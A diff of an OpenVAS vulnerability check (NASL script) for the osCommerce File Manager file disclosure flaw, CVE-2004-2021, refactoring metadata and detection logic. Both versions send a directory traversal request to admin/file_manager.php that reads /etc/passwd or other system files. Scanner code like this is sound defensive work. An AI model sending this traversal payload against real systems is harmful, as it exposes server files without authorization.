@@ -1,5 +1,5 @@
 # OpenVAS Vulnerability Test
-# $Id: oscommerce_file_manager_disclosure.nasl 6053 2017-05-01 09:02:51Z teissa $
+# $Id: oscommerce_file_manager_disclosure.nasl 7273 2017-09-26 11:17:25Z cfischer $
 # Description: File Disclosure in osCommerce's File Manager
 #
 # Authors:
@@ -33,34 +33,24 @@ directory.";
 
 if(description)
 {
-  script_id(12242);
-  script_version("$Revision: 6053 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-05-01 11:02:51 +0200 (Mon, 01 May 2017) $");
+  script_oid("1.3.6.1.4.1.25623.1.0.12242");
+  script_version("$Revision: 7273 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-09-26 13:17:25 +0200 (Tue, 26 Sep 2017) $");
   script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-
   script_cve_id("CVE-2004-2021");
   script_bugtraq_id(10364);
   script_xref(name:"OSVDB", value:"6308");
-
-  name = "File Disclosure in osCommerce's File Manager";
-  script_name(name);
- 
-
- 
-  summary = "Detect osCommerce's File Manager File Disclosure";
- 
-  script_category(ACT_GATHER_INFO);
+  script_name("File Disclosure in osCommerce's File Manager");
+  script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
- 
   script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
-
-  family = "General";
-  script_family(family);
-  script_dependencies("oscommerce_detect.nasl");
-  script_require_keys("Software/osCommerce");
+  script_family("Web application abuses");
+  script_dependencies("oscommerce_detect.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
+  script_mandatory_keys("Software/osCommerce");
+
   script_tag(name : "summary" , value : tag_summary);
   exit(0);
 }
@@ -73,22 +63,17 @@ CPE = 'cpe:/a:oscommerce:oscommerce';
 
 if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
 if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
+if( dir == "/" ) dir = "";
 
-function check_dir(path)
-{
-	req = http_get(item:string(path, 
-		"/admin/file_manager.php?action=download&filename=../../../../../../../../etc/passwd"), 
-		port:port);
- 	res = http_keepalive_send_recv(port:port, data:req);
-	if ( res == NULL ) exit(0);
- 	if(egrep(pattern:".*root:.*:0:[01]:.*", string:res))
- 	{
-          report = report_vuln_url( port:port, url:url );
-  	  security_message(port:port, data:report);
-  	  exit(0);
- 	}
+files = traversal_files();
+foreach file( keys( files ) ) {
 
+  url = "/admin/file_manager.php?action=download&filename=../../../../../../../../" + files[file];
+  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit( 0 );
+  }
 }
 
-check_dir(path:dir);
-
+exit( 99 );
